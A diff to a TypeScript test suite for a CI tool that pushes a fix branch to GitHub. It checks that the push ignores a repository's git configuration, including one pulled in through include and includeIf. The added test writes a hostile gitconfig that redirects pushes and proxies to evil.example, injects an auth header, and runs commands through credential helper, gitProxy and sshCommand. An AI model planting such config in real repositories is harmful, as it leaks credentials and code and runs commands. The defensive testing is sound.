@@ -164,6 +164,8 @@ void describe("implementation working tree", () => {
     const remoteRoot = join(tempRoot, "remote.git");
     const hooksRoot = join(repoRoot, "attacker-hooks");
     const marker = join(tempRoot, "hook-ran");
+    const includedConfig = join(tempRoot, "included.gitconfig");
+    const includedMarker = join(tempRoot, "included-config-ran");
     const pushLog = join(tempRoot, "push.json");
     const fakeGitRoot = join(tempRoot, "bin");
     const fakeGit = join(fakeGitRoot, "git");
@@ -220,8 +222,11 @@ if (push) {
     JSON.stringify({
       args,
       allowProtocol: process.env.GIT_ALLOW_PROTOCOL,
+      configPath: process.env.GIT_CONFIG,
+      configCount: process.env.GIT_CONFIG_COUNT,
       configGlobal: process.env.GIT_CONFIG_GLOBAL,
       configNoSystem: process.env.GIT_CONFIG_NOSYSTEM,
+      extraHeaderConfigured: process.env.NOOK_GIT_EXTRAHEADER !== undefined,
       noReplaceObjects: process.env.GIT_NO_REPLACE_OBJECTS,
     }) + "\\n",
   );
@@ -264,8 +269,11 @@ process.exit(result.status ?? 1);
       const publication = JSON.parse(await readFile(pushLog, "utf8")) as {
         args: string[];
         allowProtocol: string;
+        configPath: string;
+        configCount?: string;
         configGlobal: string;
         configNoSystem: string;
+        extraHeaderConfigured: boolean;
         noReplaceObjects: string;
       };
       assert.ok(publication.args.includes("--no-verify"));
@@ -277,10 +285,24 @@ process.exit(result.status ?? 1);
           "HEAD:refs/heads/fix/dependency-update",
         ),
       );
+      assert.ok(
+        publication.args.includes(
+          "--config-env=http.https://github.com/.extraheader=NOOK_GIT_EXTRAHEADER",
+        ),
+      );
+      assert.ok(!publication.args.includes("--force"));
+      assert.ok(
+        publication.args.every(
+          (argument) => !argument.includes("publication-secret"),
+        ),
+      );
       assert.ok(!publication.args.includes("origin"));
       assert.equal(publication.allowProtocol, "https");
+      assert.equal(publication.configPath, "/dev/null");
+      assert.equal(publication.configCount, undefined);
       assert.equal(publication.configGlobal, "/dev/null");
       assert.equal(publication.configNoSystem, "1");
+      assert.equal(publication.extraHeaderConfigured, true);
       assert.equal(publication.noReplaceObjects, "1");
       const { stdout } = await execFileAsync("git", [
         "--git-dir",
@@ -308,6 +330,59 @@ process.exit(result.status ?? 1);
         (await readFile(pushLog, "utf8")).trim().split("\n").length,
         1,
       );
+
+      await git("config", "--unset", "url.https://evil.example/.insteadOf");
+      await writeFile(
+        includedConfig,
+        `[url "https://evil.example/"]
+  insteadOf = https://github.com/
+[http "https://github.com/"]
+  proxy = http://proxy.evil.example:8080
+  extraHeader = Authorization: basic included
+[credential]
+  helper = !printf included > '${includedMarker}'
+[protocol "file"]
+  allow = always
+[core]
+  gitProxy = !printf included > '${includedMarker}'
+  sshCommand = printf included > '${includedMarker}'
+  hooksPath = attacker-hooks
+[remote "origin"]
+  pushurl = https://evil.example/repository.git
+`,
+      );
+      await git("config", "include.path", includedConfig);
+      await writeFile(join(repoRoot, "README.md"), "included update\n");
+      await new CiRepository(repoRoot)
+        .pushFixBranch({
+          fixBranch: "fix/dependency-update",
+          runId: "44",
+        })
+        .then((result) =>
+          CiResultAssertions.assertFailure(result, /git command failed/u),
+        );
+      assert.equal(
+        (await readFile(pushLog, "utf8")).trim().split("\n").length,
+        1,
+      );
+      await assert.rejects(access(includedMarker), /ENOENT/);
+
+      await git("config", "--unset", "include.path");
+      await git("config", "includeIf.gitdir:foo.path", includedConfig);
+      await writeFile(join(repoRoot, "README.md"), "conditional update\n");
+      await new CiRepository(repoRoot)
+        .pushFixBranch({
+          fixBranch: "fix/dependency-update",
+          runId: "45",
+        })
+        .then((result) =>
+          CiResultAssertions.assertFailure(result, /git command failed/u),
+        );
+      assert.equal(
+        (await readFile(pushLog, "utf8")).trim().split("\n").length,
+        1,
+      );
+      await assert.rejects(access(includedMarker), /ENOENT/);
     } finally {
       if (typeof previousToken === "string")
         process.env.NOOK_GITHUB_PAT = previousToken;
